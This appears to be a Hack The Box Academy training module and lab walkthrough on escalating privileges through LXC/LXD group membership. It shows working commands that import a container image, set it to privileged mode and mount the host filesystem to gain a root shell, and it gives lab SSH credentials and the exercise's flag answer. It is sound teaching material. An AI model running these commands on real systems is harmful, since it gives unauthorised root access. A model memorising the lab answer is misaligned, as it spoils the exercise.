
---

Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

Isolation and virtualization are essential because they help to manage resources and security aspects as efficiently as possible. For example, they facilitate monitoring to find errors in the system that often have nothing to do with newly developed applications. Another example would be the isolation of processes that usually require root privileges. Such an application could be a web application or API that must be isolated from the host system to prevent escalation to databases.

---

## Linux Containers

Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

By default, `LXC` consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously. A platform with `LXC` can even be organized across multiple clouds, providing portability and ensuring that applications running correctly on the developer's system will work on any other system. In addition, large applications can be started, stopped, or their environment variables changed via the Linux container interface.

The ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques. However, the enormous spread of `LXC`, an almost all-encompassing ecosystem, and innovative tools are primarily due to the Docker platform, which established Linux containers. The entire setup, from creating container templates and deploying them, configuring the operating system and networking, to deploying applications, remains the same.

#### Linux Daemon

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

From here on, there are now several ways in which we can exploit `LXC`/`LXD`. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use. The focus on security would complicate the whole initiation, make it more difficult and thus slow it down considerably. If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```


---
### "Escalate the privileges and submit the contents of flag.txt as the answer."

Students first need to connect to the spawned target machine using `SSH` and the credentials `htb-student:HTB_@cademy_stdnt!`:

```shell
ssh htb-student@STMIP
```


```shell-session
┌─[eu-academy-1]─[10.10.15.63]─[htb-ac-594497@htb-h5qyjhxa2m]─[~]
└──╼ [★]$ ssh htb-student@10.129.23.7
The authenticity of host '10.129.23.7 (10.129.23.7)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.23.7' (ECDSA) to the list of known hosts.
htb-student@10.129.23.7's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-051900-generic x86_64)

<SNIP>

htb-student@ubuntu:~$ 
```

Upon connecting, students need to inspect the contents of the ContainerImages directory:

```shell
cd ContainerImages/
ls
```


```shell-session
htb-student@ubuntu:~$ cd ContainerImages/
htb-student@ubuntu:~/ContainerImages$ ls

alpine-v3.18-x86_64-20230607_1234.tar.gz
```

Discovering the `alpine-v3.18-x86_64-20230607_1234.tar.gz` file, students need to import the image:


```shell
lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container 
lxc image list
```


```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc image import ./alpine-v3.18-x86_64-20230607_1234.tar.gz --alias alpine-container 

Image imported with fingerprint: b14f17d61b9d2997ebe1d3620fbfb2e48773678c186c2294c073e2122c41a485

htb-student@ubuntu:~/ContainerImages$ lxc image list

+------------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
|      ALIAS       | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          |
+------------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
| alpine-container | b14f17d61b9d | no     | alpine v3.18 (20230607_12:34) | x86_64       | CONTAINER | 3.62MB | Jun 20, 2023 at 5:22pm (UTC) |
+------------------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+
```

After verifying that the image has been successfully imported, students need to initiate the image and configure it with the `security.privileged=true` flag. Additionally, students need to mount the `/root` directory from the host machine to `/mnt/root` inside the container, making the host's `/root` directory accessible within the container.

```shell
lxc init alpine-container privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/root path=/mnt/root recursive=true
```

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc init alpine-container privesc -c security.privileged=true

Creating privesc

htb-student@ubuntu:~/ContainerImages$ lxc config device add privesc host-root disk source=/root path=/mnt/root recursive=true

Device host-root added to privesc
```

Finally, students need to start the container and execute the shell interpreter `/bin/sh`:

```shell
lxc start privesc
lxc exec privesc /bin/sh
```

  LXD

```shell-session
htb-student@ubuntu:~/ContainerImages$ lxc start privesc

htb-student@ubuntu:~/ContainerImages$ lxc exec privesc /bin/sh

~ # 
```

With the new root shell, students need to read the contents of the flag:

Code: shell

```shell
cat /mnt/root/flag.txt
```

  LXD

```shell-session
~ # cat /mnt/root/flag.txt

HTB{C0nT41n3rs_uhhh}
```

The flag reads `HTB{C0nT41n3rs_uhhh}`.

Answer: {hidden}